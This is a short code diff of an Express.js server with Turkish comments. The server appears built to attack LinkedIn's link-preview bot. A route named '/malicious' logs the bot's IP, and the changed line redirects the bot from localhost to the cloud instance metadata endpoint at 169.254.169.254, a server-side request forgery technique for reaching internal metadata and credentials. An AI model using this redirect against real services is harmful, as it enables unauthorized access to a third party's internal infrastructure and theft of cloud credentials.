@@ -9,7 +9,7 @@ app.get('/malicious', (req, res) => {
     console.log("[+] LinkedInBot yönlendirme rotasına geldi! IP:", req.headers['x-forwarded-for'] || req.socket.remoteAddress);
     
     // Botu LinkedIn'in kendi içindeki localhost'a 302 ile paslıyoruz
-    return res.redirect(302, 'http://127.0.0.1:80');
+    return res.redirect(302, 'http://169.254.169.254/latest/meta-data/');
 });
 
 // 2. Diğer tüm genel istekleri loglayan mevcut middleware'in
